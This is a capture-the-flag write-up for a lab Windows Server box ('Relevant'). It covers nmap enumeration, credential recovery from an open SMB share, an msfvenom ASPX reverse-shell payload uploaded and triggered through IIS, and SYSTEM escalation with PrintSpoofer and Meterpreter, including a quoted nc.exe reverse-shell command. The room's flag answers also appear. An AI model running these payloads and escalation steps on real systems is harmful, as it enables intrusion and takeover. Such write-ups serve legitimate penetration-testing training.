# Relevant

### Scenario:

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

### Scope of Work:

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

User.txt
Root.txt
Additionally, the client has provided the following scope allowances:

Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
Locate and note all vulnerabilities found
Submit the flags discovered to the dashboard
Only the IP address assigned to your machine is in scope
Find and report ALL vulnerabilities (yes, there is more than one path to root)
(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.
Note - Nothing in this room requires Metasploit

## Start of with NMAP scan

```
└─$ nmap -Pn -sV -sC THM_Target 
...
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-05-15T16:58:22+00:00
|_ssl-date: 2026-05-15T16:59:01+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2026-05-14T16:33:37
|_Not valid after:  2026-11-13T16:33:37
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-15T16:58:23
|_  start_date: 2026-05-15T16:33:35
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-15T09:58:26-07:00
|_clock-skew: mean: 1h23m59s, deviation: 3h07m52s, median: -1s
```                                                                  

Interesting points here:
- Microsoft IIS/10 web server port 80 open but no port 443
- Windows Server 2008 R2 - 2012
- SMB port open
  - user account guest is available  
- RDP port 3389 open

Closer look for vulberabilities with vulners and vuln script. Only vuln showed results:
```
$ nmap -Pn -sV -sC -script=vuln THM_Target
...
Mostly same as before
...
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```
Interesting points here
- ms17-010 definitely has a RCE capability, eternal blue (CVE-2017-0143)
- smb1 should be required and was varified in next protocol check

SMB protocol check with nmap:
```
└─$ nmap -Pn -p445 --script smb-protocols THM_Target              
...
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
```
Nmap -sC only includes a range of common ports so one more for full range of ports
```
└─$ nmap -Pn -p- -sV THM_Target 
...
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```
In browser the IP showed a just a basic IIS web server default page. GoBuster here no directories were discovered on port 80 for website. A second scan with gobuster with various wordlists
```
Feroxbuster with default  password lists:
200      GET      334l     2089w   180418c http://10.49.180.37:49663/iisstart.png
200      GET       32l       55w      703c http://10.49.180.37:49663/
```
The problem with wordlists is that unless the name of directory is in list, a custom name like "nt4wrksv" wont be present adding to a word list.
When added to wordlist will be the only directory in on port 49663 detected with status 200. which is linked with smb share.
## Starting now with SMB

First see what shares are quickly available:
```
└─$ smbclient -L THM_Target 
Password for [WORKGROUP\hacktopuser]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to THM_Target failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Sharename nt4wrksv appears to be accessible a quick search finds:
- A single file password.txt.
- no other files or directories accessible.

```
└─$ smbclient \\\\THM_Target\\nt4wrksv
Password for [WORKGROUP\hacktopuser]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 16 03:16:33 2026
  ..                                  D        0  Sat May 16 03:16:33 2026
  passwords.txt                       A       98  Sun Jul 26 01:15:33 2020
...
smb: \> GET passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
Passwords file did contain 2 passwords:
```
└─$ cat passwords.txt                                            
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                             
...
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw=="| base64 -d
Bob - !P@$$W0rD!123                                                                             
...
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d    
Bill - Juw4nnaM4n420696969!$$$                        
```
Tried an admin hidden shares but no username, either password wont work here on SMB shares at least. Also dont work on RDP using freeRDP or xrdp.
Closer look with nmap using script on port 135,139,445:
```
└─$ nmap -Pn -p 135,139,445 --script smb-enum-shares,smb-os-discovery THM_Target
...
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.49.151.205\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.49.151.205\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.49.151.205\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.49.151.205\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-15T10:15:09-07:00
```

First looking for user.txt without metasploit, first off we know CVE-2017-0143 for ms17-010 eternal blue is highly vulnerable. Looking in searchsploit with CVE shows nothing but with ms17-010 we find:
```
└─$ searchsploit ms17-010     
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'Eter | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execut | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/20 | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'E | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - ' | windows_x86-64/remote/41987.py
------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The last one is closest match 41987.py, tested and fails for unknown reason also ms17_010 metasploit exploit failed just states 

ms17_010 not vulnerable:
```
msf > use exploit/windows/smb/ms17_010_eternalblue
...
set LHOST,RHOST,LPORT then run
...
[*] THM_Target:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] THM_Target:445     - Rex::ConnectionTimeout: The connection with (THM_Target:445) timed out.
[*] THM_Target:445     - Scanned 1 of 1 hosts (100% complete)
[-] THM_Target:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
```
So skip that, but SMB is clearly able to access a share so with msfvenom there are exploit options with or without meterpreter:

Without meterpreter:
- Start a netcat listener
- Create msfvenom exploit windows/x64/shell_reverse_tcp
- Inspection of the website it shows x-powered-by asp.net so aspx format is used for exploit, this is common for IIS server to support it, look for anything indicating asp.net, IIS, Microsoft-IIS/x.x or .NET Framework, which indicate web server is running ASP.NET.
  
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -a x64 --platform windows -f aspx > exploit.aspx
```

- use smb as before but use put command to upload the exploit:

```
~# smbclient \\\\THM_Target\\nt4wrksv
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> put exploit.aspx
putting file exploit.aspx as \exploit.aspx (551.4 kb/s) (average 551.4 kb/s)
```
- Then access it from the browswer with http://THM_Target:49663/nt4wrksv/exploit.aspx and should link to netcat:

```
~# nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on THM_Target 49855
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
c:\windows\system32\inetsrv> cd \Users\Bob\Desktop
c:\Users\Bob\Desktop>type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```
Answer Q1: User flag is THM{fdk4ka34vk346ksxfr21tg789ktf45}, from simple directory traversal.

### See privileges of current user:
```
c:\Users\Bob\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Impersonation Privileges
- SeAssignPrimaryToken or SeImpersonate privilege, these two allow you to run code or even create a new process in the context of another user. To do so, you can call CreateProcessWithToken() if you have SeImpersonatePrivilege or CreateProcessAsUser() if you have SeAssignPrimaryTokenPrivilege.

From whoami /priv it appears the SeImpersonatePrivilege is enabled and is useful for excalation:

A few options here are:
- PrintSpoofer likely to work
- RoguePotato no time to check 
- GodPotato no time to check
- JuicyPotato will fail

Get PrintSpoofer first
```
https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
```
Arguments:
  -c <CMD>    Execute the command *CMD*
  -i          Interact with the new process in the current command prompt (default is non-interactive)
  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)
  -h          That's me :)

Examples:
  - Run PowerShell as SYSTEM in the current console
      PrintSpoofer.exe -i -c powershell.exe
  - Spawn a SYSTEM command prompt on the desktop of the session 1
      PrintSpoofer.exe -d 1 -c cmd.exe
  - Get a SYSTEM reverse shell
      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"

    Here the first option is one I used successfully can use either powershell.exe or cmd.exe

### Using PrintSpoofer
- Start by uploading to the folder with smbclient
- Start the netcat listener
- Connect with previous exploit from msfvenom
- Then run PrintSpoofer64.exe -i -c cmd.exe or with powershell.exe
- Check user
- Find root.txt file

```
└─$ smbclient \\\\THM_Target\\nt4wrksv
...
smb: \> put PrintSpoofer64.exe
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (15.8 kB/s) (average 15.8 kB/s)
smb: \> ls
  .                                   D        0  Mon May 18 03:16:01 2026
  ..                                  D        0  Mon May 18 03:16:01 2026
  exploit.aspx                        A     3407  Mon May 18 03:14:53 2026
  passwords.txt                       A       98  Sun Jul 26 01:15:33 2020
  PrintSpoofer64.exe                  A    27136  Mon May 18 03:15:53 2026
...
# Next netcat listener
...                                                                             
└─$ nc -lnvp 4444   
...
c:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
...
c:\windows\system32\inetsrv>cd /inetpub/wwwroot/nt4wrksv

c:\inetpub\wwwroot\nt4wrksv>dir
...
05/17/2026  10:14 AM             3,407 exploit.aspx
07/25/2020  08:15 AM                98 passwords.txt
05/17/2026  10:15 AM            27,136 PrintSpoofer64.exe
               3 File(s)         52,657 bytes
               2 Dir(s)  20,063,768,576 bytes free

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
Equally powershell would work here:
```
C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c powershell.exe
PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> ^C
```
Back to getting root.txt:
```
C:\Windows\system32>cd \Users\Administrator\desktop
C:\Users\Administrator\Desktop>dir
...
07/25/2020  08:24 AM    <DIR>          .
07/25/2020  08:24 AM    <DIR>          ..
07/25/2020  08:25 AM                35 root.txt
...
C:\Users\Administrator\Desktop>type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```
Answer Q2: root flag is THM{1fk5kf469devly1gl320zafgl345pv}

Other option spawning system on another session would not have worked with no privileged account running in qwinsta check. Requiring a logged in user:

```
C:\inetpub\wwwroot\nt4wrksv>qwinsta
qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>services                                    0  Disc                        
 console                                     1  Conn                        
 rdp-tcp                                 65536  Listen                      
```

There is no logged‑in user
- console session has no username
- services is a background session
- rdp-tcp is only listening, not active
- There is no interactive desktop session
- No one is logged in via RDP or console.

## Using metasploit instead of following the expectations of module:

The other option using metasploit: 
- Start a exploit/multi/handler to listen for meterpreter, set LHOST,RHOST,LPORT then run
- Upload a exploit using a msfvenom exploit with payload windows/x64/meterpreter/reverse_tcp, then run the exploit in browser from the folder on port 49663 connection in same way as before.

Meterpreter results:
```
meterpreter > shell
...
c:\windows\system32\inetsrv>cd /users/Bob/Desktop
c:\Users\Bob\Desktop>type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
c:\Users\Bob\Desktop>exit
```
## Escalation a lot easier

- Use 'shell' for cmd.exe
- Or for powershell run both 'load powershell' and 'with powershell_shell'

```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > shell
...
c:\windows\system32\inetsrv>cd /users/Administrator/Desktop
c:\Users\Administrator\Desktop>dir
...
 Directory of c:\Users\Administrator\Desktop

07/25/2020  08:24 AM    <DIR>          .
07/25/2020  08:24 AM    <DIR>          ..
07/25/2020  08:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,880,105,472 bytes free

c:\Users\Administrator\Desktop>type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```
